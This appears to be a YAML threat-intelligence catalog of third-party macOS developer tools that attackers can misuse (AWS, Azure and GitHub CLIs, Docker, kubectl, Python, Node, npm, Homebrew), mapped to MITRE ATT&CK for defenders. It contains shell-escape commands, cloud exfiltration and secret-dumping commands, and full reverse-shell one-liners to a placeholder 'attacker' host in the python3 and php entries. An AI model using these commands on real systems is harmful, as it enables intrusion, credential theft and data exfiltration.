# macOS LOFL (Living Off Foreign Land) Catalog
# ==============================================
#
# The first authoritative catalog of "Living Off Foreign Land" binaries on
# macOS: third-party tools commonly installed via Homebrew, pip, npm, cargo,
# or other package managers that attackers can abuse for reconnaissance,
# execution, persistence, lateral movement, defense evasion, credential
# access, exfiltration, and command-and-control.
#
# This catalog fills a gap between three existing projects:
#
#   - LOOBins (https://github.com/infosecB/LOOBins) covers native Apple-
#     supplied binaries (osascript, ditto, sips, etc.).
#   - GTFOBins (https://gtfobins.github.io/) covers Unix/Linux binaries
#     with shell escapes and privilege escalation, but is Linux-centric and
#     does not account for macOS-specific vectors (Keychain, TCC, XProtect,
#     Gatekeeper, Universal binaries, Mach-O injection).
#   - LOLBAS (https://lolbas-project.github.io/) covers Windows-native
#     binaries exclusively.
#
# LOFL targets the enormous blind spot: the developer and DevOps toolchain
# that is effectively universal on macOS enterprise and engineering systems.
# These tools are signed by their upstream projects (not Apple), routinely
# exempted from EDR and application-allowlisting policies, and provide
# capabilities (arbitrary code execution, network tunneling, cloud API
# access, credential extraction, container escape) that rival purpose-built
# offensive tooling. Because they are "expected" on developer machines,
# their execution rarely triggers alerts, making them ideal for living-off-
# the-land tradecraft adapted to the foreign-binary ecosystem.
#
# Inclusion criteria:
#   1. The tool has at least one documented offensive technique, GTFOBins-
#      style escape, or supply-chain abuse vector; OR it provides
#      capabilities uniquely dangerous on macOS (process injection, Keychain
#      access, network capture, TCC bypass).
#   2. The tool is commonly found on macOS developer or enterprise systems.
#   3. The tool is NOT a native Apple binary (those belong in LOOBins).
#
# Each entry includes MITRE ATT&CK technique IDs, prevalence estimates,
# and an assessment of why blocking the tool is operationally painful.
#
# Version: 1.0.0
# Date: 2026-05-02
# Maintainer: forensicnomicon project
# License: Same as parent project (see LICENSE)

---
schema_version: "1.0"
project: macos-lofl
catalog:

  # =========================================================================
  # CLOUD CLIs
  # =========================================================================

  - name: aws
    install: homebrew  # awscli formula
    prevalence: very_common
    description: "AWS CLI — manages all Amazon Web Services resources, credentials, and configurations"
    abuse_techniques:
      - technique: "Credential harvesting from ~/.aws/credentials"
        mitre: "T1552.001"
        description: "aws configure list and direct file reads expose AWS access keys, secret keys, and session tokens stored in plaintext"
      - technique: "S3 data exfiltration"
        mitre: "T1537"
        description: "aws s3 cp allows bulk exfiltration of local files to attacker-controlled S3 buckets over HTTPS, blending with normal cloud traffic"
      - technique: "IAM reconnaissance"
        mitre: "T1087.004"
        description: "aws iam list-users, get-account-authorization-details enumerates all users, roles, and policies in the AWS account"
      - technique: "Lambda code execution"
        mitre: "T1059"
        description: "aws lambda invoke executes arbitrary code in cloud functions, useful for pivoting from compromised developer workstation to cloud"
      - technique: "SSM reverse shell"
        mitre: "T1059.004"
        description: "aws ssm start-session provides interactive shell to EC2 instances without SSH keys, bypassing network security groups"
      - technique: "STS assume-role privilege escalation"
        mitre: "T1548"
        description: "aws sts assume-role can escalate privileges by chaining role assumptions across accounts"
    blocking_risk: high
    why_hard_to_block: "Blocks all AWS development, deployment, and infrastructure management workflows. Present on virtually every cloud-oriented macOS workstation."
    references:
      - "https://attack.mitre.org/techniques/T1552/001/"
      - "https://attack.mitre.org/techniques/T1537/"
      - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"

  - name: az
    install: homebrew  # azure-cli formula
    prevalence: common
    description: "Azure CLI — manages Microsoft Azure resources, subscriptions, and Active Directory"
    abuse_techniques:
      - technique: "Azure AD enumeration"
        mitre: "T1087.004"
        description: "az ad user list, az ad group list enumerates all Azure AD users, groups, and service principals"
      - technique: "Key Vault secret extraction"
        mitre: "T1552.001"
        description: "az keyvault secret show dumps secrets from Azure Key Vault if the compromised identity has access"
      - technique: "Storage account exfiltration"
        mitre: "T1537"
        description: "az storage blob upload-batch exfiltrates data to attacker-controlled Azure storage over HTTPS"
      - technique: "VM command execution"
        mitre: "T1059"
        description: "az vm run-command invoke executes arbitrary scripts on Azure VMs from the CLI"
      - technique: "Access token theft"
        mitre: "T1528"
        description: "az account get-access-token returns OAuth tokens that can be replayed from other machines"
    blocking_risk: high
    why_hard_to_block: "Required for Azure development and administration. Cached tokens in ~/.azure/ persist across sessions."
    references:
      - "https://attack.mitre.org/techniques/T1087/004/"
      - "https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a"

  - name: gcloud
    install: homebrew  # google-cloud-sdk cask
    prevalence: common
    description: "Google Cloud CLI — manages GCP resources, IAM, and application credentials"
    abuse_techniques:
      - technique: "Application Default Credentials theft"
        mitre: "T1552.001"
        description: "Reads ~/.config/gcloud/application_default_credentials.json for OAuth2 refresh tokens granting GCP API access"
      - technique: "GCS exfiltration"
        mitre: "T1537"
        description: "gsutil cp (bundled with gcloud SDK) transfers data to attacker-controlled GCS buckets"
      - technique: "Compute instance command execution"
        mitre: "T1059"
        description: "gcloud compute ssh and gcloud compute instances add-metadata --metadata startup-script execute commands on GCE instances"
      - technique: "Service account key creation"
        mitre: "T1098.001"
        description: "gcloud iam service-accounts keys create generates persistent API keys for any accessible service account"
      - technique: "Secret Manager extraction"
        mitre: "T1552.001"
        description: "gcloud secrets versions access extracts secrets stored in GCP Secret Manager"
    blocking_risk: high
    why_hard_to_block: "Essential for GCP development. The SDK stores long-lived refresh tokens locally."
    references:
      - "https://attack.mitre.org/techniques/T1552/001/"
      - "https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/"

  - name: gh
    install: homebrew
    prevalence: very_common
    description: "GitHub CLI — manages repositories, pull requests, issues, and GitHub API access"
    abuse_techniques:
      - technique: "GitHub token theft"
        mitre: "T1528"
        description: "gh auth token prints the stored OAuth/PAT token. Token stored in macOS Keychain or ~/.config/gh/hosts.yml"
      - technique: "Repository enumeration and cloning"
        mitre: "T1213.003"
        description: "gh repo list --limit 1000 enumerates all accessible repos. gh repo clone downloads source code including secrets in commit history"
      - technique: "Secret scanning via API"
        mitre: "T1552"
        description: "gh api /repos/{owner}/{repo}/actions/secrets enumerates CI/CD secrets (names, not values, but reveals what exists)"
      - technique: "Workflow dispatch for execution"
        mitre: "T1059"
        description: "gh workflow run triggers GitHub Actions workflows, executing attacker-controlled code in CI/CD pipelines"
    blocking_risk: high
    why_hard_to_block: "Standard GitHub development workflow tool. Blocking it forces developers to use the web UI for all GitHub operations."
    references:
      - "https://attack.mitre.org/techniques/T1528/"

  - name: vault
    install: homebrew  # hashicorp vault
    prevalence: common
    description: "HashiCorp Vault CLI — manages secrets, encryption keys, and dynamic credentials"
    abuse_techniques:
      - technique: "Secret enumeration and extraction"
        mitre: "T1552.001"
        description: "vault kv list / vault kv get dumps all secrets from the Vault server using cached tokens"
      - technique: "Token theft from ~/.vault-token"
        mitre: "T1528"
        description: "Vault persists authentication tokens to ~/.vault-token in plaintext"
      - technique: "Dynamic credential generation"
        mitre: "T1098.001"
        description: "vault read database/creds/readonly generates new database credentials on demand"
      - technique: "SSH OTP generation"
        mitre: "T1021.004"
        description: "vault ssh generates one-time SSH credentials for lateral movement to Vault-managed hosts"
    blocking_risk: high
    why_hard_to_block: "Central secrets management tool in many enterprises. Blocking it means no access to application secrets."
    references:
      - "https://attack.mitre.org/techniques/T1552/001/"

  - name: heroku
    install: homebrew  # heroku CLI (also npm)
    prevalence: moderate
    description: "Heroku CLI — manages Heroku applications, dynos, and config vars"
    abuse_techniques:
      - technique: "Config var (environment secret) extraction"
        mitre: "T1552.001"
        description: "heroku config -a <app> dumps all environment variables including database URLs, API keys, and secrets"
      - technique: "Remote shell via dyno"
        mitre: "T1059.004"
        description: "heroku run bash -a <app> provides interactive shell on Heroku dynos"
      - technique: "Database credential access"
        mitre: "T1552.001"
        description: "heroku pg:credentials:url reveals PostgreSQL connection strings with passwords"
    blocking_risk: moderate
    why_hard_to_block: "Required for Heroku platform management. Less prevalent than major cloud CLIs but still common in web development shops."
    references:
      - "https://attack.mitre.org/techniques/T1552/001/"

  # =========================================================================
  # CONTAINER / ORCHESTRATION
  # =========================================================================

  - name: docker
    install: homebrew  # docker formula or Docker Desktop cask
    prevalence: very_common
    description: "Docker CLI — builds, runs, and manages containers and images"
    abuse_techniques:
      - technique: "Container escape via privileged mode"
        mitre: "T1611"
        description: "docker run --privileged mounts host devices and disables security controls, enabling container escape"
      - technique: "Host filesystem access"
        mitre: "T1006"
        description: "docker run -v /:/host alpine provides read/write access to the entire host filesystem from within a container"
      - technique: "Arbitrary code execution"
        mitre: "T1059"
        description: "docker run <image> <cmd> executes any code inside a container, bypassing host-level application controls"
      - technique: "Image-based supply chain attack"
        mitre: "T1195.002"
        description: "docker pull can fetch trojanized images from public registries. docker build executes arbitrary RUN commands during build"
      - technique: "Network pivoting"
        mitre: "T1090"
        description: "docker run --net=host shares the host network stack. Containers can be used as network pivots"
      - technique: "Credential extraction from images"
        mitre: "T1552.001"
        description: "docker history and docker inspect reveal environment variables and build args that may contain secrets baked into images"
      - technique: "Docker socket abuse"
        mitre: "T1548"
        description: "Access to /var/run/docker.sock (default on Docker Desktop) grants effective root-equivalent control over the Docker daemon"
    blocking_risk: high
    why_hard_to_block: "Foundational to modern software development. Blocking Docker halts containerized development, testing, and CI/CD."
    references:
      - "https://attack.mitre.org/techniques/T1611/"
      - "https://gtfobins.github.io/gtfobins/docker/"

  - name: kubectl
    install: homebrew
    prevalence: very_common
    description: "Kubernetes CLI — manages clusters, pods, services, and secrets"
    abuse_techniques:
      - technique: "Exec into pod for shell access"
        mitre: "T1059.004"
        description: "kubectl exec -it <pod> -- /bin/sh provides interactive shell in any accessible pod"
      - technique: "Secret extraction"
        mitre: "T1552.001"
        description: "kubectl get secrets -o yaml dumps base64-encoded secrets (trivially decoded) from Kubernetes namespaces"
      - technique: "Kubeconfig credential theft"
        mitre: "T1552.001"
        description: "~/.kube/config contains cluster credentials, client certificates, and API endpoints in plaintext"
      - technique: "Lateral movement across namespaces"
        mitre: "T1021"
        description: "kubectl with sufficient RBAC can pivot across namespaces, accessing databases, internal services, and other pods"
      - technique: "Port forwarding for tunneling"
        mitre: "T1090"
        description: "kubectl port-forward tunnels traffic from localhost to internal cluster services, bypassing network controls"
      - technique: "Pod creation for persistence"
        mitre: "T1053"
        description: "kubectl apply can deploy attacker-controlled pods with arbitrary images and mount points"
    blocking_risk: high
    why_hard_to_block: "Blocks all Kubernetes development, debugging, and operations workflows"
    references:
      - "https://attack.mitre.org/techniques/T1552/001/"
      - "https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1"

  - name: helm
    install: homebrew
    prevalence: common
    description: "Kubernetes package manager — installs, upgrades, and manages Helm charts"
    abuse_techniques:
      - technique: "Malicious chart installation"
        mitre: "T1195.002"
        description: "helm install can deploy charts containing trojanized containers, privileged pods, or hostile RBAC configurations"
      - technique: "Chart hook code execution"
        mitre: "T1059"
        description: "Helm chart hooks (pre-install, post-install) execute arbitrary Jobs in the cluster during chart lifecycle events"
      - technique: "Release secret extraction"
        mitre: "T1552.001"
        description: "helm get values <release> reveals configuration values including passwords and API keys passed during install"
    blocking_risk: moderate
    why_hard_to_block: "Standard Kubernetes application packaging and deployment tool"
    references:
      - "https://attack.mitre.org/techniques/T1195/002/"

  # =========================================================================
  # LANGUAGE RUNTIMES (Homebrew-installed)
  # =========================================================================

  - name: python3
    install: homebrew
    prevalence: very_common
    description: "Python 3 interpreter — general-purpose scripting and application runtime"
    abuse_techniques:
      - technique: "Arbitrary code execution"
        mitre: "T1059.006"
        description: "python3 -c 'import os; os.system(\"/bin/sh\")' executes arbitrary commands. Python's extensive standard library provides file I/O, network, and process capabilities without additional packages"
      - technique: "Reverse shell"
        mitre: "T1059.006"
        description: "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"attacker\",4444));subprocess.call([\"/bin/sh\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
      - technique: "HTTP exfiltration server"
        mitre: "T1048.002"
        description: "python3 -m http.server serves files over HTTP for exfiltration. Also useful for staging payloads"
      - technique: "Keychain access via pyobjc"
        mitre: "T1555.001"
        description: "macOS-specific: Python with pyobjc can call Security.framework APIs to query Keychain items programmatically"
      - technique: "pip supply chain attack"
        mitre: "T1195.002"
        description: "pip install <typosquat> can install malicious packages that execute code at install time via setup.py"
      - technique: "SUID/capability abuse"
        mitre: "T1548.001"
        description: "If python3 has elevated permissions, it trivially provides a root shell"
      - technique: "Library hijacking"
        mitre: "T1574.001"
        description: "PYTHONPATH manipulation causes Python to load attacker-controlled modules before legitimate ones"
    blocking_risk: high
    why_hard_to_block: "Python is the most common scripting language on developer macOS systems. Blocking it halts data science, automation, web development, and DevOps workflows."
    macos_specific_notes: "Homebrew Python is distinct from the deprecated /usr/bin/python3 Apple ships. Homebrew version typically has more permissive TCC access depending on how Terminal.app is configured."
    references:
      - "https://gtfobins.github.io/gtfobins/python/"
      - "https://attack.mitre.org/techniques/T1059/006/"

  - name: node
    install: homebrew  # also nvm, fnm, volta
    prevalence: very_common
    description: "Node.js runtime — JavaScript/TypeScript execution environment"
    abuse_techniques:
      - technique: "Arbitrary code execution"
        mitre: "T1059.007"
        description: "node -e 'require(\"child_process\").execSync(\"/bin/sh\")' provides shell access through JavaScript"
      - technique: "Reverse shell"
        mitre: "T1059.007"
        description: "Node.js net module creates reverse TCP connections with shell redirection"
      - technique: "HTTP(S) exfiltration"
        mitre: "T1048.002"
        description: "Node.js http/https modules exfiltrate data over web protocols, blending with normal browser traffic"
      - technique: "npm supply chain attack"
        mitre: "T1195.002"
        description: "npm install executes preinstall/postinstall scripts from package.json, enabling arbitrary code execution at install time"
      - technique: "NODE_OPTIONS injection"
        mitre: "T1574.007"
        description: "NODE_OPTIONS=--require=/path/to/malicious.js forces Node to load attacker code before any application module"
      - technique: "Inspector/debugger protocol abuse"
        mitre: "T1059.007"
        description: "node --inspect opens a Chrome DevTools Protocol port (default 9229) allowing remote code execution if accessible"
    blocking_risk: high
    why_hard_to_block: "Foundation of modern web development. Blocking Node.js halts frontend builds, backend services, and the entire npm ecosystem."
    references:
      - "https://gtfobins.github.io/gtfobins/node/"
      - "https://attack.mitre.org/techniques/T1059/007/"

  - name: ruby
    install: homebrew  # also rbenv, rvm
    prevalence: common
    description: "Ruby interpreter — scripting language with rich system interaction capabilities"
    abuse_techniques:
      - technique: "Arbitrary code execution"
        mitre: "T1059"
        description: "ruby -e 'exec \"/bin/sh\"' provides shell access. IRB (interactive Ruby) enables exploratory system access"
      - technique: "Reverse shell"
        mitre: "T1059"
        description: "Ruby's socket library creates reverse TCP shells in a single line of code"
      - technique: "Gem supply chain attack"
        mitre: "T1195.002"
        description: "gem install can execute malicious extensions compiled and run during installation"
      - technique: "File read/write"
        mitre: "T1005"
        description: "Ruby's File class reads and writes arbitrary files with the permissions of the Ruby process"
    blocking_risk: moderate
    why_hard_to_block: "Used by CocoaPods (iOS dependency manager), Fastlane, Homebrew internals, and Jekyll. Blocking Ruby breaks iOS/macOS app development workflows."
    macos_specific_notes: "Homebrew Ruby is separate from /usr/bin/ruby (Apple system Ruby). CocoaPods and Fastlane are macOS-ecosystem-specific tools that depend on it."
    references:
      - "https://gtfobins.github.io/gtfobins/ruby/"

  - name: go
    install: homebrew
    prevalence: common
    description: "Go compiler and runtime — compiles and runs Go programs"
    abuse_techniques:
      - technique: "Compile and execute arbitrary code"
        mitre: "T1059"
        description: "go run malicious.go compiles and immediately executes Go source, producing no persistent binary on disk with careful cleanup"
      - technique: "Cross-compilation for staging"
        mitre: "T1587.001"
        description: "GOOS=linux GOARCH=amd64 go build produces Linux binaries on macOS, useful for generating payloads targeting other platforms"
      - technique: "Static binary generation"
        mitre: "T1027.002"
        description: "Go produces statically linked binaries with no external dependencies, ideal for deploying tooling to restricted environments"
      - technique: "CGO for native code execution"
        mitre: "T1059"
        description: "CGO_ENABLED=1 allows embedding C code in Go programs, enabling calls to macOS system frameworks"
    blocking_risk: moderate
    why_hard_to_block: "Essential for Go developers and increasingly common in cloud-native tooling (Docker, Kubernetes, Terraform are all written in Go)."
    references:
      - "https://gtfobins.github.io/gtfobins/go/"

  - name: php
    install: homebrew
    prevalence: moderate
    description: "PHP interpreter — server-side scripting language"
    abuse_techniques:
      - technique: "Arbitrary code execution"
        mitre: "T1059"
        description: "php -r 'system(\"/bin/sh\");' provides shell. PHP has extensive system interaction functions: exec, system, passthru, shell_exec, popen, proc_open"
      - technique: "Reverse shell"
        mitre: "T1059"
        description: "php -r '$s=fsockopen(\"attacker\",4444);exec(\"/bin/sh <&3 >&3 2>&3\");' creates a reverse shell"
      - technique: "File operations"
        mitre: "T1005"
        description: "PHP can read/write any file accessible to the process with file_get_contents/file_put_contents"
    blocking_risk: low
    why_hard_to_block: "Less common on modern macOS dev machines but still present for WordPress/Laravel development"
    references:
      - "https://gtfobins.github.io/gtfobins/php/"

  - name: perl
    install: homebrew  # distinct from /usr/bin/perl system Perl
    prevalence: moderate
    description: "Perl interpreter — text processing and system administration scripting"
    abuse_techniques:
      - technique: "Arbitrary code execution"
        mitre: "T1059"
        description: "perl -e 'exec \"/bin/sh\"' provides shell. Perl's system(), exec(), backticks provide multiple code execution paths"
      - technique: "Reverse shell"
        mitre: "T1059"
        description: "Perl's socket module creates reverse TCP connections for remote shell access"
      - technique: "CPAN supply chain"
        mitre: "T1195.002"
        description: "cpan install can execute arbitrary Makefile.PL code during module installation"
    blocking_risk: low
    why_hard_to_block: "System administration scripts and legacy applications. Less prevalent than Python/Node but still present."
    references:
      - "https://gtfobins.github.io/gtfobins/perl/"

  # =========================================================================
  # PACKAGE MANAGERS (supply chain vectors)
  # =========================================================================

  - name: pip3
    install: homebrew  # bundled with python3
    prevalence: very_common
    description: "Python package installer — installs packages from PyPI"
    abuse_techniques:
      - technique: "Malicious package installation"
        mitre: "T1195.002"
        description: "pip install <package> executes setup.py at install time. Typosquatting attacks on PyPI are well-documented (e.g., colourama, python3-dateutil)"
      - technique: "Arbitrary code via setup.py"
        mitre: "T1059.006"
        description: "pip install . runs setup.py which can contain arbitrary Python code including reverse shells, credential theft, or persistence mechanisms"
      - technique: "Requirements file poisoning"
        mitre: "T1195.002"
        description: "Modifying requirements.txt to point to attacker-controlled packages or --index-url to a malicious PyPI mirror"
      - technique: "pip download for payload staging"
        mitre: "T1105"
        description: "pip download fetches packages (including compiled wheels with native code) from the internet, useful for ingress tool transfer"
    blocking_risk: high
    why_hard_to_block: "pip is the primary Python package installation mechanism. Blocking it halts all Python dependency management."
    references:
      - "https://attack.mitre.org/techniques/T1195/002/"
      - "https://blog.phylum.io/pypi-malware-replaces-crypto-addresses-in-developers-clipboard"

  - name: npm
    install: homebrew  # bundled with node
    prevalence: very_common
    description: "Node.js package manager — installs packages from npmjs.com registry"
    abuse_techniques:
      - technique: "Preinstall/postinstall script execution"
        mitre: "T1195.002"
        description: "npm install runs lifecycle scripts (preinstall, postinstall) that execute arbitrary commands. This is the primary npm supply chain attack vector (cf. event-stream, ua-parser-js incidents)"
      - technique: "npx arbitrary execution"
        mitre: "T1059.007"
        description: "npx <package> downloads and immediately executes any npm package without prior installation, enabling one-shot code execution"
      - technique: "Registry token theft"
        mitre: "T1528"
        description: "~/.npmrc may contain authentication tokens for private registries. npm token list enumerates valid tokens"
      - technique: "Global package persistence"
        mitre: "T1546"
        description: "npm install -g places executables in PATH. A trojanized global package persists across shell sessions"
    blocking_risk: high
    why_hard_to_block: "npm is essential to JavaScript/TypeScript development. The npm registry has over 2 million packages."
    references:
      - "https://attack.mitre.org/techniques/T1195/002/"
      - "https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident"

  - name: yarn
    install: homebrew  # also npm
    prevalence: common
    description: "Alternative Node.js package manager with similar capabilities to npm"
    abuse_techniques:
      - technique: "Lifecycle script execution"
        mitre: "T1195.002"
        description: "yarn install runs the same preinstall/postinstall scripts as npm, with identical supply chain risk"
      - technique: "yarn dlx arbitrary execution"
        mitre: "T1059.007"
        description: "yarn dlx (Yarn Berry equivalent of npx) downloads and executes arbitrary packages"
    blocking_risk: moderate
    why_hard_to_block: "Common alternative to npm, especially in large frontend codebases (React, Next.js projects)"
    references:
      - "https://attack.mitre.org/techniques/T1195/002/"

  - name: brew
    install: other  # self-bootstrapping
    prevalence: very_common
    description: "Homebrew — macOS package manager for installing CLI tools and applications"
    abuse_techniques:
      - technique: "Arbitrary formula execution"
        mitre: "T1195.002"
        description: "brew install runs Ruby formulae that execute arbitrary code during installation (download, patch, configure, build, install phases)"
      - technique: "Tap poisoning"
        mitre: "T1195.002"
        description: "brew tap adds third-party formula repositories. Malicious taps can shadow official formulae or introduce trojanized packages"
      - technique: "Cask installation for persistence"
        mitre: "T1546"
        description: "brew install --cask installs full macOS applications (.app bundles) including Launch Agents/Daemons for persistence"
      - technique: "Post-install script execution"
        mitre: "T1059"
        description: "Homebrew formulae have post_install hooks that run arbitrary Ruby code after installation"
    blocking_risk: high
    why_hard_to_block: "Homebrew is the de facto package manager for macOS. Blocking it prevents installation and updating of virtually all third-party developer tools."
    macos_specific_notes: "Homebrew is macOS-specific (and Linux via Linuxbrew). It installs to /opt/homebrew (Apple Silicon) or /usr/local (Intel), directories that are typically not monitored by EDR as closely as /usr or /bin."
